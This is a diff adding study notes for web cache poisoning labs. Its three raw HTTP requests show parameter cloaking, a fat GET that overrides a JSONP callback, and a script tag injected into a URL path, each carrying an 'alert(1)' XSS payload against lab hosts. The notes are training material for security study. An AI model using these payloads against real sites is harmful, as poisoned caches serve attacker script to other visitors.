@@ -141,12 +141,62 @@ Origin: https://lwkhe2fbn1.0a4300d7030cd8938203cfc100c4007f.web-security-academy
 ## 7. Parameter cloaking
 
 ```
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=alert(1)%3B%2F%2F HTTP/2
+Host: 0a76004b03e2b331835d3c1f005700e1.web-security-academy.net
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Cache-Control: max-age=0
+Cookie: country=[object Object]
+Upgrade-Insecure-Requests: 1
+Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="120", "Chromium";v="120"
+Sec-Ch-Ua-Platform: Windows
+Sec-Ch-Ua-Mobile: ?0
+Content-Length: 0
+
 
 ```
 
 
-## 8. 
+## 8. Web cache poisoning via a fat GET request
 
 ```
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+Host: 0aa8003003afcb8a806394a20083000b.web-security-academy.net
+Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: script
+Referer: https://0aa8003003afcb8a806394a20083000b.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=1
+Content-Length: 20
+
+callback=alert(1);//
+```
+
+## 9. URL normalization
+
+```
+GET /post<script>alert(1)</script> HTTP/2
+Host: 0a460043042c246b973a0e2b00b7009b.web-security-academy.net
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Referer: https://0a460043042c246b973a0e2b00b7009b.web-security-academy.net/
+Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="120", "Chromium";v="120"
+Sec-Ch-Ua-Platform: Windows
+Sec-Ch-Ua-Mobile: ?0
+Content-Length: 0
+
 
 ```
